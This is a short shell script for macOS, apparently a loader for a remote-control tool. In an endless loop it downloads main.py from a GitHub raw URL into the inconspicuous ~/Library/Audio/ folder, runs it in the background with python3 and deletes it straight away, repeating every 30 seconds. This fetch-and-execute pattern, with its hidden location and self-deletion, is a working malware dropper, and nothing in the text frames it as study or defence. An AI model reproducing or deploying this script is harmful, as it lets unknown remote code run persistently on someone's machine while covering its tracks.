run() {
    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/main.py -o ~/Library/Audio/main.py

    python3 ~/Library/Audio/main.py &
    rm ~/Library/Audio/main.py
}

while true; do
    run

    sleep 30
done
